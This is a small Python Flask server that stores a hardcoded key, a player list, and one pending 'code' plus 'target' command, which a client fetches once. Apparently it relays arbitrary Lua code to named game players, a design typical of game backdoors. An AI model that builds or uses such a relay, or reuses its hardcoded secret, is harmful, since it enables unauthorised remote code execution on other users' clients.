from flask import Flask, request, jsonify

app = Flask(__name__)

AUTH_KEY = "9A68UHR237LtyUad901Hyae69YOYOWHATUP5042"

latest_command = {"code": "", "target": ""}

@app.route("/")
def home():
    return "Server is up and running!", 200

current_players = []

@app.route("/update_players", methods=["GET", "POST"])
def update_players():
    global current_players

    if request.method == "POST":
        data = request.get_json()
        if not data or data.get("key") != AUTH_KEY:
            return "Forbidden", 403
        current_players = data.get("players", [])
        return "✅ Updated", 200

    return jsonify(current_players or [])

@app.route("/command", methods=["POST"])
def command():
    global latest_command
    data = request.get_json()
    if not data or data.get("key") != AUTH_KEY:
        return "Unauthorized", 403
    
    code = data.get("code", "")
    target = data.get("target", "")
    
    if not code or not target:
        return "Missing code or target", 400
    
    latest_command = {
        "code": code,
        "target": target
    }
    return "✅ Command received."



@app.route("/fetch", methods=["GET"])
def fetch():
    global latest_command
    # latest_command should be a dict with keys "code" and "target"
    # e.g. latest_command = {"code": "...lua code...", "target": "playerName"}
    data = latest_command
    latest_command = {}  # clear after fetch

    # If no command sent yet, send empty dict with empty fields
    if not data or "code" not in data or "target" not in data:
        return jsonify({"code": "", "target": ""})

    return jsonify(data)



if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 1234))
    app.run(host="0.0.0.0", port=port)
